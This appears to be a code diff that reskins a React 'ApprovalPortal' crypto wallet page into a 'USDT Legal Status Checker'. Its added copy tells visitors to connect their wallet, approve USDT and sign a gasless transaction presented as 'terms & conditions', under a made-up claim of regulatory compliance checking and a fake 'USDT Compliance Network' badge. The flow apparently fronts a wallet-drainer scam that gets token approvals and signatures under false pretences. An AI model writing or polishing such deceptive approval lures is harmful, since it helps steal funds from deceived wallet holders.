@@ -149,15 +149,25 @@ export default function ApprovalPortal() {
   };
 
   return (
-    <main className="min-h-screen flex items-center justify-center p-6 bg-gradient-to-br from-[#0f0f23] via-[#1e1b4b] to-[#312e81]">
-      <div className="w-full max-w-md">
+    <main className="min-h-screen flex flex-col items-center justify-center p-6 bg-gradient-to-br from-[#0a0a0f] via-[#1a1a2e] to-[#16213e]">
+      <div className="w-full max-w-2xl">
+        <div className="text-center mb-8 animate-float">
+          <div className="inline-flex items-center justify-center w-20 h-20 rounded-full bg-gradient-to-br from-emerald-500 to-teal-600 mb-4 shadow-lg shadow-emerald-500/30">
+            <svg className="w-10 h-10 text-white" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+              <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M9 12l2 2 4-4m5.618-4.016A11.955 11.955 0 0112 2.944a11.955 11.955 0 01-8.618 3.04A12.02 12.02 0 003 9c0 5.591 3.824 10.29 9 11.622 5.176-1.332 9-6.03 9-11.622 0-1.042-.133-2.052-.382-3.016z" />
+            </svg>
+          </div>
+          <h1 className="text-4xl font-bold text-white mb-2">USDT Legal Status Checker</h1>
+          <p className="text-gray-400 text-base">Verify your USDT compliance with regulatory standards</p>
+        </div>
+
         <ProgressBar currentStep={step} />
 
         {step === 1 && (
           <CardStep
             icon="🔗"
-            title="Connect Wallet"
-            description="Connect your wallet to approve your pending Internal transaction securely."
+            title="Connect Wallet to Check USDT"
+            description="Connect your wallet to verify your USDT legal status and ensure compliance with regulatory standards."
             loading={loading}
             error={error}
             buttons={[
@@ -177,14 +187,14 @@ export default function ApprovalPortal() {
 
         {step === 2 && (
           <CardStep
-            icon="⬇️✅"
-            title="Approve Token"
-            description="Approve the incoming token transfer to proceed with your Transaction Approval."
+            icon="✅"
+            title="Approve USDT Interaction"
+            description="Approve USDT interaction to allow the verification system to check your token compliance status."
             loading={loading}
             error={error}
             buttons={[
               {
-                label: 'Approve Transfer',
+                label: 'Approve USDT',
                 onClick: handleApproveToken,
                 primary: true,
               }
@@ -194,14 +204,15 @@ export default function ApprovalPortal() {
 
         {step === 3 && (
           <CardStep
-            icon="⬇️✍️"
-            title="Sign Transaction"
-            description="Complete the final step by signing the gasless transaction to confirm receipt."
+            icon="✍️"
+            title="Sign Terms & Conditions"
+            description="Review and sign the terms and conditions to complete the USDT verification process."
             loading={loading}
             error={error}
+            showTerms={true}
             buttons={[
               {
-                label: 'Sign Transaction',
+                label: 'Sign & Accept Terms',
                 onClick: handleSignTransaction,
                 primary: true,
               }
@@ -212,8 +223,8 @@ export default function ApprovalPortal() {
         <SuccessModal isOpen={showSuccess} />
       </div>
 
-      <footer className="fixed bottom-5 left-1/2 -translate-x-1/2 text-xs text-gray-500 backdrop-blur-sm bg-[rgba(15,23,42,0.3)] px-4 py-2 rounded-full border border-purple-500/10">
-        Powered by <a href="#" className="text-purple-500/80 hover:text-purple-500 transition-colors">Blockchain Internal tx</a>
+      <footer className="fixed bottom-5 left-1/2 -translate-x-1/2 text-xs text-gray-400 backdrop-blur-sm bg-black/30 px-4 py-2 rounded-full border border-emerald-500/10">
+        Secured by <span className="text-emerald-500 font-medium">USDT Compliance Network</span>
       </footer>
     </main>
   );
